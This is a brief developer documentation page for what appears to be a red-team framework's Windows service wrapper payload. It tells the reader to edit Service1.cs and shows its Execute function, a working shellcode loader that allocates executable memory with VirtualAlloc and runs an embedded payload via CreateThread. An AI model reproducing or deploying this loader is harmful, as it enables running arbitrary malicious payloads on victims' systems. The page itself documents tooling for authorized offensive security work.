+++
title = "Development"
chapter = false
weight = 15
pre = "<b>2. </b>"
+++

## Development Environment

Visual Studio

## Modifying the Service

If you want to modify the service, edit the `Payload_Types/service_wrapper/agent_code/WindowsService1/Service1.cs` file. Specifically, the `Execute` function contains the logic:

```c#
public bool Execute()
{
    //replace with your own shellcode
    byte[] shellcode = GetResource("loader");
    UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
    IntPtr hThread = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr pinfo = IntPtr.Zero;
    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
    WaitForSingleObject(hThread, 0xFFFFFFFF);
    return true;
}
```
